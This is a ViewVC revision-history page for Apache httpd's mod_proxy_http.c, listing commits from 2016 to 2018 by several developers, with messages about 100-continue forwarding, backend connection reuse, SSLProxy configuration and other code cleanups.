- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1836588)

Modified
*Tue Jul 24 21:55:29 2018 UTC*
(6 years, 6 months ago)
by *ylavic*

File length: 89111 byte(s)

Diff to [previous 1836383](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836383&r2=1836588)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1836383&r2=1836588&diff_format=h))
```
mod_proxy_http: forward 100-continue.

Handle end-to-end 100-continue, according to RFC 7231, such that the client
request body is not read/forwarded (according to its "Expect:" header) until
the backend wants to receive it (with interim 100 continue response), or never
forwarded if the backend provides a (non-interim) response and doesn't need
the client body at all.

This is achieved by filling the header_brigade in ap_proxy_http_prefetch()
and letting ap_proxy_http_request() determine whether it should forward that
brigade only (with the "Expect: 100-continue" specified by the client or added
according to "ping=" configuration), or forward the whole body for the usual
case (as before).

When 100-continue expectation is in place, the body is actually forwarded by
ap_proxy_http_process_response() when/if a "100 continue" response is sent by
the backend, otherwise the body is discarded; a future enhancement could make
so that in a balancer configuration, the body could be forwarded to another
balancer member depending on the status/error from the backend.

So stream_reqbody_cl() and stream_reqbody_chunked() functions are adapted to be
called by either ap_proxy_http_request() or ap_proxy_http_process_response(),
while spool_reqbody_cl() still spools the body in ap_proxy_http_prefetch() thus
before the backend is connected/reused to avoid inactivity on the connection
for the prefetch time (the prefetched body is also forwarded according to the
100-continue expectation, though).

Also, since the brigades and other runtime objects now need to be shared by the
ap_proxy_http_*() functions chain, a proxy_http_req_t struct/context is created
from the start and passed to them as (the single) argument. This is also a good
candidate for a future async baton, if we wanted to let the MPM event wait for
connection data for us at any stage and be called back ;)

Finally, ap_send_interim_response() is modified to correcly handle 100 continue
responses once, and take care of clearing r->expecting_100 only for them.

PR 60330.

```

---

Revision [**1836383**](/viewvc?view=revision&revision=1836383) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836383&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1836383&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1836383))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1836383)

Modified
*Fri Jul 20 19:36:01 2018 UTC*
(6 years, 6 months ago)
by *rpluem*

File length: 87287 byte(s)

Diff to [previous 1829790](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1829790&r2=1836383)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1829790&r2=1836383&diff_format=h))
```
* Always retrieve conditional function. static variable might contain garbage if module was reloaded in a static build.

```

---

Revision [**1829790**](/viewvc?view=revision&revision=1829790) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1829790&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1829790&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1829790))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1829790)

Modified
*Sun Apr 22 15:58:18 2018 UTC*
(6 years, 9 months ago)
by *ylavic*

File length: 87362 byte(s)

Diff to [previous 1829657](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1829657&r2=1829790)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1829657&r2=1829790&diff_format=h))
```
Axe ap_rgetline_core(), not used anymore.

```

---

Revision [**1829657**](/viewvc?view=revision&revision=1829657) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1829657&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1829657&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1829657))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1829657)

Modified
*Fri Apr 20 13:55:43 2018 UTC*
(6 years, 9 months ago)
by *ylavic*

File length: 87367 byte(s)

Diff to [previous 1829573](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1829573&r2=1829657)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1829573&r2=1829657&diff_format=h))
```
mod_proxy_http: follow up to [r1829573](/viewvc?view=revision&revision=1829573): remain EBCDIC friendly.

Keep using ap_rgetline() as before [r1829573](/viewvc?view=revision&revision=1829573), since ap_rgetline_core() is
EBCDIC agnostic.

```

---

Revision [**1829573**](/viewvc?view=revision&revision=1829573) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1829573&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1829573&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1829573))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1829573)

Modified
*Thu Apr 19 16:06:57 2018 UTC*
(6 years, 9 months ago)
by *ylavic*

File length: 87372 byte(s)

Diff to [previous 1828927](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1828927&r2=1829573)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1828927&r2=1829573&diff_format=h))
```
mod_proxy_http: make use of AP_GETLINE_NOSPC_EOL in ap_proxygetline().

Fixes response header thrown away after the previous one was considered too
large and truncated.

PR 62196.

```

---

Revision [**1828927**](/viewvc?view=revision&revision=1828927) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1828927&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1828927&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1828927))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1828927)

Modified
*Wed Apr 11 19:18:03 2018 UTC*
(6 years, 9 months ago)
by *covener*

File length: 88001 byte(s)

Diff to [previous 1828926](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1828926&r2=1828927)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1828926&r2=1828927&diff_format=h))
```
add log id for [r1828926](/viewvc?view=revision&revision=1828926)

```

---

Revision [**1828926**](/viewvc?view=revision&revision=1828926) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1828926&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1828926&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1828926))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1828926)

Modified
*Wed Apr 11 19:11:52 2018 UTC*
(6 years, 9 months ago)
by *covener*

File length: 87996 byte(s)

Diff to [previous 1824176](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1824176&r2=1828926)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1824176&r2=1828926&diff_format=h))
```
PR62199: add worker parameter ResponseFieldSize to mod_proxy

Submitted By: Hank Ibell
Committed By: covener

```

---

Revision [**1824176**](/viewvc?view=revision&revision=1824176) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1824176&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1824176&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1824176))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1824176)

Modified
*Tue Feb 13 21:22:05 2018 UTC*
(6 years, 11 months ago)
by *minfrin*

File length: 86287 byte(s)

Diff to [previous 1818726](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1818726&r2=1824176)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1818726&r2=1824176&diff_format=h))
```
mod_proxy: Provide an RFC1035 compliant version of the hostname in the
proxy_worker_shared structure. PR62085

```

---

Revision [**1818726**](/viewvc?view=revision&revision=1818726) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1818726&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1818726&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1818726))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1818726)

Modified
*Tue Dec 19 22:46:27 2017 UTC*
(7 years, 1 month ago)
by *ylavic*

File length: 86284 byte(s)

Diff to [previous 1807318](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1807318&r2=1818726)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1807318&r2=1818726&diff_format=h))
```
mod_proxy: allow SSLProxyCheckPeer* usage for all proxy modules.

PR 61857.

Proposed by: Markus Gausling <markusgausling googlemail.com>
Reviewed by: ylavic

```

---

Revision [**1807318**](/viewvc?view=revision&revision=1807318) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1807318&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1807318&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1807318))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1807318)

Modified
*Tue Sep 5 07:27:33 2017 UTC*
(7 years, 4 months ago)
by *jfclere*

File length: 86714 byte(s)

Diff to [previous 1777611](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1777611&r2=1807318)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1777611&r2=1807318&diff_format=h))
```
Fix for JBCS-390.
Note it is related to PR  59007

```

---

Revision [**1777611**](/viewvc?view=revision&revision=1777611) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1777611&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1777611&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1777611))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1777611)

Modified
*Fri Jan 6 13:58:03 2017 UTC*
(8 years ago)
by *jailletc36*

File length: 86604 byte(s)

Diff to [previous 1756186](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1756186&r2=1777611)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1756186&r2=1777611&diff_format=h))
```
Move definition of ASCII_ZERO to httpd.h and rename it ZERO_ASCII for consistancy reason.
Remove definition of ASCII_CRLF which is the same as CRLF_ASCII.

Use ZERO_ASCII and CRLF_ASCII in mod_proxy_http

```

---

Revision [**1756186**](/viewvc?view=revision&revision=1756186) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1756186&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1756186&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1756186))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1756186)

Modified
*Fri Aug 12 13:58:10 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 86663 byte(s)

Diff to [previous 1756065](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1756065&r2=1756186)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1756065&r2=1756186&diff_format=h))
```
[mod_proxy_]http: follow up to [r1750392](/viewvc?view=revision&revision=1750392).

Export [ap_]check_pipeline() and use it also for ap_proxy_check_connection(),
so that all the necessary checks on the connection are done before reusing it.

```

---

Revision [**1756065**](/viewvc?view=revision&revision=1756065) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1756065&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1756065&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1756065))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1756065)

Modified
*Thu Aug 11 23:37:45 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 86595 byte(s)

Diff to [previous 1756060](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1756060&r2=1756065)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1756060&r2=1756065&diff_format=h))
```
Revert [r1756064](/viewvc?view=revision&revision=1756064) and [r1756060](/viewvc?view=revision&revision=1756060) until fixed (tests framework passes).

```

---

Revision [**1756060**](/viewvc?view=revision&revision=1756060) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1756060&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1756060&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1756060))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1756060)

Modified
*Thu Aug 11 22:32:42 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 86663 byte(s)

Diff to [previous 1754979](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754979&r2=1756060)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754979&r2=1756060&diff_format=h))
```
[mod_proxy_]http: follow up to [r1750392](/viewvc?view=revision&revision=1750392).
Export [ap_]check_pipeline() and use it also for ap_proxy_check_connection().

[Reverted by [r1756065](/viewvc?view=revision&revision=1756065)]

```

---

Revision [**1754979**](/viewvc?view=revision&revision=1754979) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754979&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754979&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1754979))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1754979)

Modified
*Tue Aug 2 16:42:39 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 86595 byte(s)

Diff to [previous 1754975](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754975&r2=1754979)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754975&r2=1754979&diff_format=h))
```
mod_proxy_http: 204 or 304 cannot happen here since ap_is_HTTP_ERROR() above
is true.

```

---

Revision [**1754975**](/viewvc?view=revision&revision=1754975) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754975&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754975&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1754975))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1754975)

Modified
*Tue Aug 2 16:34:56 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 86736 byte(s)

Diff to [previous 1754974](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754974&r2=1754975)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754974&r2=1754975&diff_format=h))
```
mod_proxy_http: handle 401 error override in the same block as other errors
to simplify logic, no functional change.

```

---

Revision [**1754974**](/viewvc?view=revision&revision=1754974) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754974&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754974&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1754974))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1754974)

Modified
*Tue Aug 2 16:27:26 2016 UTC*
(8 years, 5 months ago)
by *ylavic*

File length: 86704 byte(s)

Diff to [previous 1754159](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754159&r2=1754974)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1754159&r2=1754974&diff_format=h))
```
mod_proxy_http: don't pretend we are sending a body before ProxyErrorOverride
takes place, the response it to be handled by ErrorDocument is this case.
Also it useless to take care of pre-read data since the body is discarded in
this case.

```

---

Revision [**1754159**](/viewvc?view=revision&revision=1754159) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754159&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1754159&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1754159))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1754159)

Modified
*Tue Jul 26 17:16:18 2016 UTC*
(8 years, 6 months ago)
by *ylavic*

File length: 86687 byte(s)

Diff to [previous 1750474](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750474&r2=1754159)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750474&r2=1754159&diff_format=h))
```
mod_proxy_http: ping retry only if full 100-continue conditions are met.

```

---

Revision [**1750474**](/viewvc?view=revision&revision=1750474) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750474&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750474&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1750474))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1750474)

Modified
*Tue Jun 28 11:19:36 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 86682 byte(s)

Diff to [previous 1750416](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750416&r2=1750474)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750416&r2=1750474&diff_format=h))
```
mod_proxy: follow up to [r1750392](/viewvc?view=revision&revision=1750392).
Avoid double checking the connection in ap_proxy_connect_backend() when
ap_proxy_check_backend() says it is up and good to go.

This can be done by moving the PROXY_WORKER_IS_USABLE() check in
ap_proxy_check_backend(), since it is called by ap_proxy_connect_backend(),
and not calling the latter if the former succeeded (for the modules using it).

```

---

Revision [**1750416**](/viewvc?view=revision&revision=1750416) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750416&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750416&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1750416))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1750416)

Modified
*Mon Jun 27 21:49:15 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 86631 byte(s)

Diff to [previous 1750412](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750412&r2=1750416)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750412&r2=1750416&diff_format=h))
```
mod_proxy: we don't need ap_proxy_ssl_connection_cleanup() anymore with
ap_proxy_check_backend() used at connection reuse time, so remove its last call and deprecate it.

```

---

Revision [**1750412**](/viewvc?view=revision&revision=1750412) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750412&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750412&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1750412))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1750412)

Modified
*Mon Jun 27 21:39:53 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 86710 byte(s)

Diff to [previous 1750392](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750392&r2=1750412)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1750392&r2=1750412&diff_format=h))
```
mod_proxy: use proxy_conn_rec->tmp_bb where appopriate to avoid temporary
brigade create/destroy.

```

---

Revision [**1750392**](/viewvc?view=revision&revision=1750392) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750392&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1750392&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1750392))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1750392)

Modified
*Mon Jun 27 17:26:12 2016 UTC*
(8 years, 7 months ago)
by *ylavic*

File length: 86692 byte(s)

Diff to [previous 1747469](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1747469&r2=1750392)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1747469&r2=1750392&diff_format=h))
```
mod_proxy_{http,ajp,fcgi}}: don't reuse backend connections with data available
before the request is sent.  PR 57832.

ap_proxy_check_backend() can be used before ap_proxy_connect_backend() to try
to read available data (including from the filters), and is called by
ap_proxy_connect_backend() to check the socket state only (as before, still
relevant after ap_proxy_check_backend() due to filter data which may not have
triggered a real socket operation).

```

---

Revision [**1747469**](/viewvc?view=revision&revision=1747469) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1747469&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1747469&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1747469))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1747469)

Modified
*Thu Jun 9 00:06:42 2016 UTC*
(8 years, 7 months ago)
by *wrowe*

File length: 86621 byte(s)

Diff to [previous 1744460](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1744460&r2=1747469)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1744460&r2=1747469&diff_format=h))
```
Rename ap_casecmpstr[n]() to ap_cstr_casecmp[n](), update with APR doxygen

```

---

Revision [**1744460**](/viewvc?view=revision&revision=1744460) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1744460&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1744460&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1744460))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1744460)

Modified
*Wed May 18 21:54:09 2016 UTC*
(8 years, 8 months ago)
by *jailletc36*

File length: 86611 byte(s)

Diff to [previous 1740928](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1740928&r2=1744460)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1740928&r2=1744460&diff_format=h))
```
Avoid memory allocation before making sure that this handler can handle the URL

```

---

Revision [**1740928**](/viewvc?view=revision&revision=1740928) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1740928&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1740928&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1740928))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1740928)

Modified
*Tue Apr 26 00:04:57 2016 UTC*
(8 years, 9 months ago)
by *ylavic*

File length: 86601 byte(s)

Diff to [previous 1735649](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1735649&r2=1740928)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1735649&r2=1740928&diff_format=h))
```
mod_proxy, mod_ssl: Handle SSLProxy* directives in <Proxy> sections,
allowing per backend TLS configuration.

```

---

Revision [**1735649**](/viewvc?view=revision&revision=1735649) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1735649&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1735649&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1735649))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1735649)

Modified
*Fri Mar 18 17:33:40 2016 UTC*
(8 years, 10 months ago)
by *trawick*

File length: 86606 byte(s)

Diff to [previous 1729507](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1729507&r2=1735649)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1729507&r2=1735649&diff_format=h))
```
Add missing proxy_run_detach_backend() on error path

```

---

Revision [**1729507**](/viewvc?view=revision&revision=1729507) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1729507&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1729507&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1729507))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1729507)

Modified
*Tue Feb 9 23:38:59 2016 UTC*
(8 years, 11 months ago)
by *ylavic*

File length: 86548 byte(s)

Diff to [previous 1726782](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1726782&r2=1729507)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1726782&r2=1729507&diff_format=h))
```
mod_proxy: axe negative "ping" parameter setting and handling.
This used to check for the backend connection readability only (instead of
the full ping/100-continue round-trip), but the case is already handled by
ap_proxy_connect_backend() which is always called.

```

---

Revision [**1726782**](/viewvc?view=revision&revision=1726782) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1726782&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1726782&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1726782))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1726782)

Modified
*Tue Jan 26 12:20:33 2016 UTC*
(9 years ago)
by *rpluem*

File length: 87384 byte(s)

Diff to [previous 1726776](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1726776&r2=1726782)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1726776&r2=1726782&diff_format=h))
```
* Use new ap_proxy_buckets_lifetime_transform

```

---

Revision [**1726776**](/viewvc?view=revision&revision=1726776) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1726776&view=markup))
([download](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1726776&view=co))
([annotate](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?annotate=1726776))
- [[select for diffs]](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?view=log&r1=1726776)

Modified
*Tue Jan 26 11:59:07 2016 UTC*
(9 years ago)
by *rpluem*

File length: 89115 byte(s)

Diff to [previous 1721759](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1721759&r2=1726776)
([colored](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?r1=1721759&r2=1726776&diff_format=h))
```
* For creating new buckets always use the bucket allocator of the brigade in
  which we want to put the bucket.

  Currently this does not change behaviour as r->connection->bucket_alloc and
  to->bucket_alloc are the same. It is a cleanup and preparation for abstracting
  this in a proxy API.

```

---

Revision [**1721759**](/viewvc?view=revision&revision=1721759) -
([view](/viewvc/httpd/httpd/trunk/modules/proxy/mod_proxy_http.c?revision=1721759&view=markup))
